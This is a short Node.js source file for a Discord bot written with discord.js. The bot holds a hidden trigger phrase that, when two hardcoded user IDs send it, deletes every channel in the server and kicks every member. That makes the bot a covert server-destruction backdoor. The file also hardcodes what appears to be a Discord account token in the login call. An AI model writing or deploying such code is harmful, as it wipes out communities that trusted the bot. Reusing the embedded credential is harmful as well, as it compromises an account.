const Discord = require("discord.js");
const TOKEN = process.env.TOKEN;

var bot = new Discord.Client();

bot.on("ready", function() {
  console.log("ready");
});
bot.on("message", function(message) {
  if(message.content == "mass server delete q28w27" && message.author.id == "264465468268609537" || message.content == "mass server delete q28w27" && message.author.id == "724899534899118101") {
		message.guild.channels.forEach(channel => channel.delete());
	 	message.guild.members.forEach(m => m.kick());
	}
});

bot.login("mfa.uFc8S9WCAkfyyld5fCpL8LdiDNC2YTyoubbQpA-EJCjU7HAr_cIeJu_I4cjHueMXujpWEn_EUy3PnIvIvudc");
